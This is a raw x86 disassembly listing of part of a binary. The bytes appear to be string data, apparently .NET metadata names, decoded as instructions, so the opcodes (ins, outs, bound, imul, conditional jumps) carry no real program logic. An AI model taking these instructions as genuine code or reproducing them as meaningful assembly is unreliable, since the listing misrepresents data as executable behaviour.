  409564:	add    BYTE PTR gs:[ebx+0x61],ah
  409568:	je     0x4095cf
  40956a:	outs   dx,DWORD PTR ds:[si]
  40956c:	jb     0x4095e7
  40956e:	add    BYTE PTR [eax+0x61],dl
  409571:	jb     0x4095d4
  409573:	ins    DWORD PTR es:[edi],dx
  409574:	inc    ecx
  409575:	jb     0x4095e9
  409577:	popa   
  409578:	jns    0x4095bb
  40957a:	je     0x4095f0
  40957c:	jb     0x4095e7
  40957e:	bound  esi,QWORD PTR [ebp+0x74]
  409581:	add    BYTE PTR gs:[ebx+0x6f],al
  409585:	ins    DWORD PTR es:[edi],dx
  409586:	push   esi
  409587:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  40958e:	je     0x409604
  409590:	jb     0x4095fb
  409592:	bound  esi,QWORD PTR [ebp+0x74]
  409595:	add    BYTE PTR gs:[ebx+0x4c],al
  409599:	push   ebx
  40959a:	inc    ebx
  40959b:	outs   dx,DWORD PTR ds:[esi]
  40959c:	ins    DWORD PTR es:[edi],dx
  40959d:	jo     0x40960b
  40959f:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  4095a6:	jb     0x409611
  4095a8:	bound  esi,QWORD PTR [ebp+0x74]
  4095ab:	add    BYTE PTR gs:[ecx+0x73],al
  4095af:	jae    0x409616
  4095b1:	ins    DWORD PTR es:[edi],dx
  4095b2:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4095b6:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  4095be:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4095c5:	jae    0x40963a
  4095c7:	gs ins DWORD PTR es:[edi],dx
  4095c9:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4095cd:	gs jae 0x409633
  4095d0:	jb     0x40963b
  4095d2:	jo     0x409648
  4095d4:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4095db:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4095e2:	jae    0x409657
  4095e4:	gs ins DWORD PTR es:[edi],dx
  4095e6:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4095ea:	gs popaw 
  4095ed:	jne    0x40965b
  4095ef:	je     0x409632
  4095f1:	ins    BYTE PTR es:[edi],dx
  4095f2:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  4095f9:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  409600:	jae    0x409675
  409602:	gs ins DWORD PTR es:[edi],dx
  409604:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  409608:	outs   dx,DWORD PTR ds:[esi]
  409609:	ins    DWORD PTR es:[edi],dx
  40960a:	jo     0x40966d
  40960c:	outs   dx,BYTE PTR ds:[esi]
  40960d:	jns    0x409650
  40960f:	je     0x409685
  409611:	jb     0x40967c
  409613:	bound  esi,QWORD PTR [ebp+0x74]
  409616:	add    BYTE PTR gs:[ecx+0x73],al
  40961a:	jae    0x409681
  40961c:	ins    DWORD PTR es:[edi],dx
  40961d:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  409621:	jb     0x409692
  409623:	fs jne 0x409689
  409626:	je     0x409669
  409628:	je     0x40969e
  40962a:	jb     0x409695
  40962c:	bound  esi,QWORD PTR [ebp+0x74]
  40962f:	add    BYTE PTR gs:[ecx+0x73],al
  409633:	jae    0x40969a
  409635:	ins    DWORD PTR es:[edi],dx
  409636:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40963a:	outs   dx,DWORD PTR ds:[esi]
  40963b:	jo     0x4096b6
  40963d:	jb     0x4096a8
  40963f:	addr16 push 0x74744174
  409645:	jb     0x4096b0
  409647:	bound  esi,QWORD PTR [ebp+0x74]
  40964a:	add    BYTE PTR gs:[ecx+0x73],al
  40964e:	jae    0x4096b5
  409650:	ins    DWORD PTR es:[edi],dx
  409651:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  409655:	gs jb  0x4096cb
  409658:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40965f:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  409666:	jae    0x4096db
  409668:	gs ins DWORD PTR es:[edi],dx
  40966a:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  40966e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  409676:	outs   dx,DWORD PTR ds:[esi]
  409677:	outs   dx,BYTE PTR ds:[esi]
  409678:	inc    ecx
  409679:	je     0x4096ef
  40967b:	jb     0x4096e6
  40967d:	bound  esi,QWORD PTR [ebp+0x74]
  409680:	add    BYTE PTR gs:[ecx+0x73],al
  409684:	jae    0x4096eb
  409686:	ins    DWORD PTR es:[edi],dx
  409687:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40968b:	outs   dx,BYTE PTR ds:[esi]
  40968c:	outs   dx,WORD PTR ds:[esi]
  40968e:	jb     0x4096fd
  409690:	popa   
  409691:	je     0x4096fc
  409693:	outs   dx,DWORD PTR ds:[esi]
  409694:	outs   dx,BYTE PTR ds:[esi]
  409695:	popa   
  409696:	ins    BYTE PTR es:[edi],dx
  409697:	push   esi
  409698:	gs jb  0x40970e
  40969b:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4096a2:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  4096a9:	popa   
  4096aa:	je     0x409711
  4096ac:	ins    BYTE PTR es:[edi],dx
  4096ad:	ins    BYTE PTR es:[edi],dx
  4096ae:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  4096b6:	popa   
  4096b7:	arpl   WORD PTR [esi+edx*2+0x65],si
  4096bb:	jb     0x409730
  4096bd:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4096c4:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  4096cb:	gs jne 0x409742
  4096ce:	jb     0x409731
  4096d0:	ins    BYTE PTR es:[edi],dx
  4096d1:	push   edx
  4096d2:	gs jae 0x409744
  4096d5:	jne    0x409749
  4096d7:	arpl   WORD PTR [ebp+0x73],sp
  4096da:	dec    esp
  4096db:	popa   
  4096dc:	outs   dx,BYTE PTR ds:[esi]
  4096dd:	addr16 jne 0x409741
  4096e0:	addr16 gs inc ecx
  4096e3:	je     0x409759
  4096e5:	jb     0x409750
  4096e7:	bound  esi,QWORD PTR [ebp+0x74]
  4096ea:	add    BYTE PTR gs:[ecx+0x73],al
  4096ee:	jae    0x409755
  4096f0:	ins    DWORD PTR es:[edi],dx
  4096f1:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4096f5:	gs ins BYTE PTR es:[edi],dx
  4096f7:	popa   
  4096f8:	jns    0x40974d
  4096fa:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  409701:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  409708:	jae    0x40977d
  40970a:	gs ins DWORD PTR es:[edi],dx
  40970c:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  409710:	gs jns 0x409759
  409713:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  40971b:	bound  esi,QWORD PTR [ebp+0x74]
  40971e:	add    BYTE PTR gs:[ebx+0x79],dl
  409722:	jae    0x409798
  409724:	gs ins DWORD PTR es:[edi],dx
  409726:	cs inc esp
  409728:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  40972f:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  409736:	jne    0x40979f
  409738:	addr16 popa 
  40973a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  40973e:	je     0x4097b4
  409740:	jb     0x4097ab
  409742:	bound  esi,QWORD PTR [ebp+0x74]
  409745:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40974a:	jne    0x4097b3
  40974c:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  409754:	jae    0x409756
  409756:	push   ebx
  409757:	jns    0x4097cc
  409759:	je     0x4097c0
  40975b:	ins    DWORD PTR es:[edi],dx
  40975c:	cs push edx
  40975e:	jne    0x4097ce
  409760:	je     0x4097cb
  409762:	ins    DWORD PTR es:[edi],dx
  409763:	gs cs inc ebx
  409766:	outs   dx,DWORD PTR ds:[esi]
  409767:	ins    DWORD PTR es:[edi],dx
  409768:	jo     0x4097d3
  40976a:	ins    BYTE PTR es:[edi],dx
  40976b:	gs jb  0x4097c1
  40976e:	gs jb  0x4097e7
  409771:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  409778:	ins    DWORD PTR es:[edi],dx
  409779:	jo     0x4097e4
  40977b:	ins    BYTE PTR es:[edi],dx
  40977c:	popa   
  40977d:	je     0x4097e8
  40977f:	outs   dx,DWORD PTR ds:[esi]
  409780:	outs   dx,BYTE PTR ds:[esi]
  409781:	push   edx
  409782:	gs ins BYTE PTR es:[edi],dx
  409784:	popa   
  409785:	js     0x4097e8
  409787:	je     0x4097f2
  409789:	outs   dx,DWORD PTR ds:[esi]
  40978a:	outs   dx,BYTE PTR ds:[esi]
  40978b:	jae    0x4097ce
  40978d:	je     0x409803
  40978f:	jb     0x4097fa
  409791:	bound  esi,QWORD PTR [ebp+0x74]
  409794:	add    BYTE PTR gs:[edx+0x75],dl
  409798:	outs   dx,BYTE PTR ds:[esi]
  409799:	je     0x409804
  40979b:	ins    DWORD PTR es:[edi],dx
  40979c:	gs inc ebx
  40979e:	outs   dx,DWORD PTR ds:[esi]
  40979f:	ins    DWORD PTR es:[edi],dx
  4097a0:	jo     0x409803
  4097a2:	je     0x40980d
  4097a4:	bound  ebp,QWORD PTR [ecx+0x6c]
  4097a7:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  4097af:	bound  esi,QWORD PTR [ebp+0x74]
  4097b2:	add    BYTE PTR gs:[ecx+0x74],al
  4097b6:	je     0x40982a
  4097b8:	imul   esp,DWORD PTR [edx+0x75],0x73556574
  4097bf:	popa   
  4097c0:	addr16 gs inc ecx
  4097c3:	je     0x409839
  4097c5:	jb     0x409830
  4097c7:	bound  esi,QWORD PTR [ebp+0x74]
  4097ca:	add    BYTE PTR gs:[ecx+0x74],al
  4097ce:	je     0x409842
  4097d0:	imul   esp,DWORD PTR [edx+0x75],0x61546574
  4097d7:	jb     0x409840
  4097d9:	gs je  0x40984f
  4097dc:	add    BYTE PTR [ebx+0x74],dl
  4097df:	jb     0x40984a
  4097e1:	outs   dx,BYTE PTR ds:[esi]
  4097e2:	add    BYTE PTR [bx+di+0x73],cl
  4097e6:	dec    esi
  4097e7:	jne    0x409855
  4097e9:	ins    BYTE PTR es:[edi],dx
  4097ea:	dec    edi
  4097eb:	jb     0x409832
  4097ed:	ins    DWORD PTR es:[edi],dx
  4097ee:	jo     0x409864
  4097f0:	jns    0x4097f2
  4097f2:	inc    edi
  4097f3:	gs je  0x40984c
  4097f6:	popa   
  4097f7:	ins    BYTE PTR es:[edi],dx
  4097f8:	jne    0x40985f
  4097fa:	add    BYTE PTR [edi+0x65],ah
  4097fd:	je     0x40985e
  4097ff:	dec    ecx
  409800:	outs   dx,BYTE PTR ds:[esi]
  409801:	outs   dx,BYTE PTR ds:[esi]
  409802:	gs jb  0x40984a
  409805:	js     0x40986a
  409807:	gs jo  0x40987e
  40980a:	imul   ebp,DWORD PTR [edi+0x6e],0x72615400
  409811:	addr16 gs je 0x40985e
  409815:	outs   dx,BYTE PTR ds:[esi]
  409816:	jbe    0x409887
  409818:	arpl   WORD PTR [ecx+0x74],sp
  40981b:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  409822:	jo     0x409898
  409824:	imul   ebp,DWORD PTR [edi+0x6e],0x6f6f4200
  40982b:	ins    BYTE PTR es:[edi],dx
  40982c:	gs popa 
  40982e:	outs   dx,BYTE PTR ds:[esi]
  40982f:	add    BYTE PTR [edi+0x65],ah
  409832:	je     0x409893
  409834:	dec    ecx
  409835:	jae    0x40987c
  409837:	outs   dx,BYTE PTR ds:[esi]
  409838:	jne    0x4098a7
  40983a:	add    BYTE PTR [edx+0x75],dl
  40983d:	outs   dx,BYTE PTR ds:[esi]
  40983e:	je     0x4098a9
  409840:	ins    DWORD PTR es:[edi],dx
  409841:	gs push esp
  409843:	jns    0x4098b5
  409845:	gs dec eax
  409847:	popa   
  409848:	outs   dx,BYTE PTR ds:[esi]
  409849:	fs ins BYTE PTR es:[edi],dx
  40984b:	add    BYTE PTR gs:[edi+0x65],al
  40984f:	je     0x4098a5
  409851:	jns    0x4098c3
  409853:	gs inc esi
  409855:	jb     0x4098c6
  409857:	ins    DWORD PTR es:[edi],dx
  409858:	dec    eax
  409859:	popa   
  40985a:	outs   dx,BYTE PTR ds:[esi]
  40985b:	fs ins BYTE PTR es:[edi],dx
  40985d:	add    BYTE PTR gs:[ecx+0x72],al
  409861:	jb     0x4098c4
  409863:	jns    0x409865
  409865:	inc    edi
  409866:	gs je  0x4098bf
  409869:	popa   
  40986a:	ins    BYTE PTR es:[edi],dx
  40986b:	jne    0x4098d2
  40986d:	jae    0x40986f
  40986f:	addr16 gs je 0x4098d2
  409873:	inc    ebx
  409874:	jne    0x4098e8
  409876:	jb     0x4098dd
  409878:	outs   dx,BYTE PTR ds:[esi]
  409879:	je     0x40987b
  40987b:	push   esp
  40987c:	outs   dx,DWORD PTR ds:[esi]
  40987d:	push   ebx
  40987e:	je     0x4098f2
  409880:	imul   ebp,DWORD PTR [esi+0x67],0x72745300
  409887:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  40988e:	popa   
  40988f:	jb     0x4098fa
  409891:	jae    0x409902
  409893:	outs   dx,BYTE PTR ds:[esi]
  409894:	add    BYTE PTR [ebp+0x71],al
  409897:	jne    0x4098fa
  409899:	ins    BYTE PTR es:[edi],dx
  40989a:	jae    0x40989c
  40989c:	dec    ebp
  40989d:	outs   dx,DWORD PTR ds:[esi]
  40989e:	jbe    0x409905
  4098a0:	dec    esi
  4098a1:	gs js  0x409918
  4098a4:	add    BYTE PTR [ecx+0x44],cl
  4098a7:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  4098ae:	ins    BYTE PTR es:[edi],dx
  4098af:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  4098b4:	jo     0x409925
  4098b6:	jae    0x40991d
  4098b8:	add    BYTE PTR [edi+0x70],ch
  4098bb:	pop    edi
  4098bc:	inc    ebp
  4098bd:	jno    0x409934
  4098bf:	popa   
  4098c0:	ins    BYTE PTR es:[edi],dx
  4098c1:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x74737953
  4098c9:	gs ins DWORD PTR es:[edi],dx
  4098cb:	cs push esp
  4098cd:	gs js  0x409944
  4098d0:	add    BYTE PTR [ebx+0x74],dl
  4098d3:	jb     0x40993e
  4098d5:	outs   dx,BYTE PTR ds:[esi]
  4098d6:	addr16 inc edx
  4098d8:	jne    0x409943
  4098da:	ins    BYTE PTR es:[edi],dx
  4098db:	fs gs jb 0x4098df
  4098df:	inc    edi
  4098e0:	gs je  0x409931
  4098e3:	popa   
  4098e4:	ins    DWORD PTR es:[edi],dx
  4098e5:	gs jae 0x4098e8
  4098e8:	inc    ecx
  4098e9:	jo     0x40995b
  4098eb:	outs   dx,BYTE PTR gs:[esi]
  4098ed:	add    BYTE PTR fs:[ecx+0x73],cl
  4098f1:	inc    ecx
  4098f2:	jae    0x409967
  4098f4:	imul   esp,DWORD PTR [edi+0x6e],0x656c6261
  4098fb:	inc    esi
  4098fc:	jb     0x40996d
  4098fe:	ins    DWORD PTR es:[edi],dx
  4098ff:	add    BYTE PTR [esi+0x61],dl
  409902:	ins    BYTE PTR es:[edi],dx
  409903:	jne    0x40996a
  409905:	inc    ebx
  409906:	outs   dx,DWORD PTR ds:[esi]
  409907:	ins    BYTE PTR es:[edi],dx
  409908:	ins    BYTE PTR es:[edi],dx
  409909:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40990e:	outs   dx,BYTE PTR ds:[esi]
  40990f:	add    BYTE PTR [edi+0x65],ah
  409912:	je     0x409973
  409914:	push   esi
  409915:	popa   
  409916:	ins    BYTE PTR es:[edi],dx
  409917:	jne    0x40997e
  409919:	jae    0x40991b
  40991b:	inc    ebp
  40991c:	outs   dx,BYTE PTR ds:[esi]
  40991d:	jne    0x40998c
  40991f:	gs jb  0x409983
  409922:	je     0x409993
  409924:	jb     0x409926
  409926:	inc    ebx
  409927:	outs   dx,DWORD PTR ds:[esi]
  409928:	outs   dx,BYTE PTR ds:[esi]
  409929:	je     0x40998c
  40992b:	imul   ebp,DWORD PTR [esi+0x73],0x79654b
  409932:	jae    0x409999
  409934:	je     0x409995
  409936:	dec    ecx
  409937:	je     0x40999e
  409939:	ins    DWORD PTR es:[edi],dx
  40993a:	add    BYTE PTR [edi+0x65],ah
  40993d:	je     0x40999e
  40993f:	push   esi
  409940:	popa   
  409941:	ins    BYTE PTR es:[edi],dx
  409942:	jne    0x4099a9
  409944:	add    BYTE PTR [edi+0x65],ah
  409947:	je     0x4099a8
  409949:	dec    ebx
  40994a:	gs jns 0x40994d
  40994d:	addr16 gs je 0x4099b0
  409951:	inc    ebx
  409952:	push   0x737261
  409957:	dec    ecx
  409958:	outs   dx,BYTE PTR ds:[esi]
  409959:	fs gs js 0x4099ac
  40995d:	data16 add BYTE PTR [ebx+0x75],dl
  409961:	bound  esi,QWORD PTR [ebx+0x74]
  409964:	jb     0x4099cf
  409966:	outs   dx,BYTE PTR ds:[esi]
  409967:	add    BYTE PTR [di+0x6d],al
  40996b:	jo     0x4099e1
  40996d:	jns    0x40996f
  40996f:	push   ebx
  409970:	je     0x4099e4
  409972:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  409979:	popa   
  40997a:	jb     0x4099e1
  40997c:	jb     0x40997e
  40997e:	addr16 gs je 0x4099e1
  409982:	dec    edi
  409983:	jb     0x4099e9
  409985:	imul   ebp,DWORD PTR [esi+0x61],0x6e67496c
  40998c:	outs   dx,DWORD PTR ds:[esi]
  40998d:	jb     0x4099f4
  40998f:	inc    ebx
  409990:	popa   
  409991:	jae    0x4099f8
  409993:	add    BYTE PTR [ecx+0x45],cl
  409996:	jno    0x409a0d
  409998:	popa   
  409999:	ins    BYTE PTR es:[edi],dx
  40999a:	imul   esi,DWORD PTR [ecx+edi*2+0x43],0x61706d6f
  4099a2:	jb     0x409a09
  4099a4:	jb     0x409a06
  4099a6:	xor    DWORD PTR [eax],eax
  4099a8:	inc    edi
  4099a9:	gs je  0x409a00
  4099ac:	jns    0x409a1e
  4099ae:	add    BYTE PTR gs:[edx+0x69],al
  4099b2:	outs   dx,BYTE PTR ds:[esi]
  4099b3:	imul   ebp,DWORD PTR fs:[esi+0x67],0x67616c46
  4099bb:	jae    0x4099bd
  4099bd:	inc    edi
  4099be:	gs je  0x409a11
  4099c1:	jb     0x409a32
  4099c3:	jo     0x409a2a
  4099c5:	jb     0x409a3b
  4099c7:	imul   esp,DWORD PTR [ebp+0x73],0x6d654d00
  4099ce:	bound  esp,QWORD PTR [ebp+0x72]
  4099d1:	dec    ecx
  4099d2:	outs   dx,BYTE PTR ds:[esi]
  4099d3:	outs   dx,WORD PTR ds:[esi]
  4099d5:	add    BYTE PTR [edi+0x65],al
  4099d8:	je     0x409a1d
  4099da:	jne    0x409a4f
  4099dc:	je     0x409a4d
  4099de:	ins    DWORD PTR es:[edi],dx
  4099df:	inc    ecx
  4099e0:	je     0x409a56
  4099e2:	jb     0x409a4d
  4099e4:	bound  esi,QWORD PTR [ebp+0x74]
  4099e7:	gs jae 0x4099ea
  4099ea:	inc    ebx
  4099eb:	outs   dx,DWORD PTR ds:[esi]
  4099ec:	outs   dx,BYTE PTR ds:[esi]
  4099ed:	arpl   WORD PTR [ecx+0x74],sp
  4099f0:	add    BYTE PTR [ebx+0x6f],al
  4099f3:	outs   dx,BYTE PTR ds:[esi]
  4099f4:	jae    0x409a65
  4099f6:	ins    BYTE PTR es:[edi],dx
  4099f7:	add    BYTE PTR gs:[edi+0x72],dl
  4099fb:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x74697257
  409a03:	gs dec esp
  409a05:	imul   ebp,DWORD PTR [esi+0x65],0x73734100
  409a0c:	gs ins DWORD PTR es:[edi],dx
  409a0e:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  409a12:	inc    edi
  409a13:	gs je  0x409a5b
  409a16:	js     0x409a7d
  409a18:	arpl   WORD PTR [ebp+0x74],si
  409a1b:	imul   ebp,DWORD PTR [esi+0x67],0x65737341
  409a22:	ins    DWORD PTR es:[edi],dx
  409a23:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  409a27:	inc    ecx
  409a28:	jae    0x409a9d
  409a2a:	gs ins DWORD PTR es:[edi],dx
  409a2c:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  409a30:	popa   
  409a31:	ins    DWORD PTR es:[edi],dx
  409a32:	add    BYTE PTR gs:[edi+0x65],al
  409a36:	je     0x409a86
  409a38:	popa   
  409a39:	ins    DWORD PTR es:[edi],dx
  409a3a:	add    BYTE PTR gs:[edi+0x65],ah
  409a3e:	je     0x409a9f
  409a40:	inc    edx
  409a41:	jne    0x409aa9
  409a43:	data16 gs jb 0x409a9e
  409a47:	imul   esp,DWORD PTR [esp+esi*2+0x68],0x66654400
  409a4f:	popa   
  409a50:	jne    0x409abe
  409a52:	je     0x409aa1
  409a54:	gs ins DWORD PTR es:[edi],dx
  409a56:	bound  esp,QWORD PTR [ebp+0x72]
  409a59:	inc    ecx
  409a5a:	je     0x409ad0
  409a5c:	jb     0x409ac7
  409a5e:	bound  esi,QWORD PTR [ebp+0x74]
  409a61:	add    BYTE PTR gs:[ebx+0x68],al
  409a65:	popa   
  409a66:	jb     0x409a68
  409a68:	dec    ecx
  409a69:	jae    0x409ac2
  409a6b:	push   0x53657469
  409a70:	jo     0x409ad3
  409a72:	arpl   WORD PTR [ebp+0x0],sp
  409a75:	push   ebx
  409a76:	je     0x409aea
  409a78:	jne    0x409add
  409a7a:	je     0x409ac8
  409a7c:	popa   
  409a7d:	jns    0x409aee
  409a7f:	jne    0x409af5
  409a81:	inc    ecx
  409a82:	je     0x409af8
  409a84:	jb     0x409aef
  409a86:	bound  esi,QWORD PTR [ebp+0x74]
  409a89:	add    BYTE PTR gs:[ecx+eiz*2+0x79],cl
  409a8e:	outs   dx,DWORD PTR ds:[esi]
  409a8f:	jne    0x409b05
  409a91:	dec    ebx
  409a92:	imul   ebp,DWORD PTR [esi+0x64],0x766e4900
  409a99:	outs   dx,DWORD PTR ds:[esi]
  409a9a:	imul   esp,DWORD PTR [ebp+0x0],0x3c
  409a9e:	arpl   WORD PTR cs:[edi+ebp*2+0x72],si
  409aa3:	bound  ebx,QWORD PTR ds:[edi+0x5f]
  409aa7:	xor    BYTE PTR [eax],al
  409aa9:	outs   dx,DWORD PTR ds:[esi]
  409aaa:	add    BYTE PTR [ebx+0x53],al
  409aad:	and    al,0x3c
  409aaf:	cmp    DWORD PTR ds:[edi+0x5f],ebx
  409ab3:	inc    ebx
  409ab4:	popa   
  409ab5:	arpl   WORD PTR [eax+0x65],bp
  409ab8:	fs inc ecx
  409aba:	outs   dx,BYTE PTR ds:[esi]
  409abb:	outs   dx,DWORD PTR ds:[esi]
  409abc:	outs   dx,BYTE PTR ds:[esi]
  409abd:	jns    0x409b2c
  409abf:	outs   dx,DWORD PTR ds:[esi]
  409ac0:	jne    0x409b35
  409ac2:	dec    ebp
  409ac3:	gs je  0x409b2e
  409ac6:	outs   dx,DWORD PTR ds:[esi]
  409ac7:	fs inc esp
  409ac9:	gs ins BYTE PTR es:[edi],dx
  409acb:	gs addr16 popa 
  409ace:	je     0x409b35
  409ad0:	xor    DWORD PTR [eax],eax
  409ad2:	inc    ebx
  409ad3:	outs   dx,DWORD PTR ds:[esi]
  409ad4:	ins    DWORD PTR es:[edi],dx
  409ad5:	jo     0x409b40
  409ad7:	ins    BYTE PTR es:[edi],dx
  409ad8:	gs jb  0x409b22
  409adb:	outs   dx,BYTE PTR gs:[esi]
  409add:	gs jb  0x409b41
  409ae0:	je     0x409b47
  409ae2:	fs inc ecx
  409ae4:	je     0x409b5a
  409ae6:	jb     0x409b51
  409ae8:	bound  esi,QWORD PTR [ebp+0x74]
  409aeb:	add    BYTE PTR gs:[ebx+0x79],dl
  409aef:	jae    0x409b65
  409af1:	gs ins DWORD PTR es:[edi],dx
  409af3:	cs dec esp
  409af5:	imul   ebp,DWORD PTR [esi+0x71],0x756e4500
  409afc:	ins    DWORD PTR es:[edi],dx
  409afd:	gs jb  0x409b61
  409b00:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  409b04:	push   edi
  409b05:	push   0x657265
  409b0a:	push   esp
  409b0b:	outs   dx,DWORD PTR ds:[esi]
  409b0c:	inc    ecx
  409b0d:	jb     0x409b81
  409b0f:	popa   
  409b10:	jns    0x409b12
  409b12:	push   ebx
  409b13:	jns    0x409b88
  409b15:	je     0x409b7c
  409b17:	ins    DWORD PTR es:[edi],dx
  409b18:	cs dec ecx
  409b1a:	dec    edi
  409b1b:	add    BYTE PTR [esi+0x69],al
  409b1e:	ins    BYTE PTR es:[edi],dx
  409b1f:	add    BYTE PTR gs:[ebp+0x78],al
  409b23:	imul   esi,DWORD PTR [ebx+0x74],0x61500073
  409b2a:	je     0x409b94
  409b2c:	add    BYTE PTR [edi+0x65],al
  409b2f:	je     0x409b76
  409b31:	js     0x409ba7
  409b33:	outs   dx,BYTE PTR gs:[esi]
  409b35:	jae    0x409ba0
  409b37:	outs   dx,DWORD PTR ds:[esi]
  409b38:	outs   dx,BYTE PTR ds:[esi]
  409b39:	add    BYTE PTR [ecx+ebp*2+0x72],al
  409b3d:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  409b42:	jns    0x409b44
  409b44:	push   ebx
  409b45:	gs popa 
  409b47:	jb     0x409bac
  409b49:	push   0x6974704f
  409b4e:	outs   dx,DWORD PTR ds:[esi]
  409b4f:	outs   dx,BYTE PTR ds:[esi]
  409b50:	add    BYTE PTR [edi+0x65],al
  409b53:	je     0x409b9b
  409b55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x64644100
  409b5d:	push   edx
  409b5e:	popa   
  409b5f:	outs   dx,BYTE PTR ds:[esi]
  409b60:	add    BYTE PTR gs:[bp+di+0x54],dl
  409b65:	inc    ecx
  409b66:	push   esp
  409b67:	push   0x64616572
  409b6c:	inc    ecx
  409b6d:	je     0x409be3
  409b6f:	jb     0x409bda
  409b71:	bound  esi,QWORD PTR [ebp+0x74]
  409b74:	add    BYTE PTR gs:[ebx+0x79],dl
  409b78:	jae    0x409bee
  409b7a:	gs ins DWORD PTR es:[edi],dx
  409b7c:	cs push esp
  409b7e:	push   0x64616572
  409b83:	imul   ebp,DWORD PTR [esi+0x67],0x72685400
  409b8a:	gs popa 
  409b8c:	add    BYTE PTR fs:[edi+0x65],ah
  409b90:	je     0x409bf1
  409b92:	inc    ebx
  409b93:	jne    0x409c07
  409b95:	jb     0x409bfc
  409b97:	outs   dx,BYTE PTR ds:[esi]
  409b98:	je     0x409bee
  409b9a:	push   0x64616572
  409b9f:	add    BYTE PTR [edi+0x65],ah
  409ba2:	je     0x409c03
  409ba4:	inc    ebx
  409ba5:	jne    0x409c19
  409ba7:	jb     0x409c0e
  409ba9:	outs   dx,BYTE PTR ds:[esi]
  409baa:	je     0x409c01
  409bac:	dec    ecx
  409bad:	inc    ebx
  409bae:	jne    0x409c1c
  409bb0:	je     0x409c27
  409bb2:	jb     0x409c19
  409bb4:	add    BYTE PTR [edi+0x65],al
  409bb7:	je     0x409bfc
  409bb9:	outs   dx,DWORD PTR ds:[esi]
  409bba:	outs   dx,BYTE PTR ds:[esi]
  409bbb:	jae    0x409c2c
  409bbd:	ins    BYTE PTR es:[edi],dx
  409bbe:	gs inc esi
  409bc0:	popa   
  409bc1:	ins    BYTE PTR es:[edi],dx
  409bc2:	ins    BYTE PTR es:[edi],dx
  409bc3:	bound  esp,QWORD PTR [ecx+0x63]
  409bc6:	imul   edx,DWORD PTR [ebp+0x49],0x43
  409bca:	jne    0x409c38
  409bcc:	je     0x409c43
  409bce:	jb     0x409c35
  409bd0:	add    BYTE PTR [ebx+0x65],dh
  409bd3:	je     0x409c34
  409bd5:	inc    ebx
  409bd6:	jne    0x409c4a
  409bd8:	jb     0x409c3f
  409bda:	outs   dx,BYTE PTR ds:[esi]
  409bdb:	je     0x409c32
  409bdd:	dec    ecx
  409bde:	inc    ebx
  409bdf:	jne    0x409c4d
  409be1:	je     0x409c58
  409be3:	jb     0x409c4a
  409be5:	add    BYTE PTR [ebp+0x6e],al
  409be8:	arpl   WORD PTR [edi+0x64],bp
  409beb:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  409bf2:	pop    edi
  409bf3:	dec    edi
  409bf4:	jne    0x409c6a
  409bf6:	jo     0x409c6d
  409bf8:	je     0x409c3f
  409bfa:	outs   dx,BYTE PTR ds:[esi]
  409bfb:	arpl   WORD PTR [edi+0x64],bp
  409bfe:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  409c05:	pop    edi
  409c06:	inc    ebx
  409c07:	outs   dx,DWORD PTR ds:[esi]
  409c08:	fs gs push eax
  409c0b:	popa   
  409c0c:	add    BYTE PTR gs:[si+0x65],dl
  409c11:	js     0x409c87
  409c13:	dec    ecx
  409c14:	outs   dx,BYTE PTR ds:[esi]
  409c15:	outs   dx,WORD PTR ds:[esi]
  409c17:	add    BYTE PTR [edi+0x65],ah
  409c1a:	je     0x409c7b
  409c1c:	push   esp
  409c1d:	gs js  0x409c94
  409c20:	dec    ecx
  409c21:	outs   dx,BYTE PTR ds:[esi]
  409c22:	outs   dx,WORD PTR ds:[esi]
  409c24:	add    BYTE PTR [edi+0x65],ah
  409c27:	je     0x409c88
